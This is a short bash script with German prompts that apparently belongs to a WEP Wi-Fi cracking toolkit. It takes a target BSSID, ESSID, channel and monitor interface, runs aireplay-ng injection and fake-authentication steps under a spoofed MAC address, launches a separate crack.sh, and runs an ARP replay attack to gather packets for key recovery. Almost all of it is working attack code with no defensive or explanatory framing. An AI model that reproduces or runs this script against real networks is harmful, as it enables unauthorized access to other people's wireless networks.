#!/bin/bash

if [ $# -lt 4 ]
then
	killall -e airodump-ng
	exit 1
fi

args=("$@")
bssid=${args[0]}
essid=${args[1]}
channel=${args[2]}
mon=${args[3]}

echo "Warte einen Moment..."
sleep 2

clear
#aireplay-ng -1 0 -a $bssid -h "00:11:22:33:44:55" -e $essid $mon
aireplay-ng -9 -a $bssid -h "00:11:22:33:44:55" -e $essid $mon
echo 
echo "Falls der Vorgang nicht erfolgreich abgeschlossen wurde, beende das Script jetzt!"
echo 
echo "Drücke eine beliebige Taste um fortzufahren..."
read -sn1

clear
echo "Starte Cracker..."
xterm -e "./crack.sh" $bssid &

clear
aireplay-ng -3 -b $bssid -h 00:11:22:33:44:55 $mon
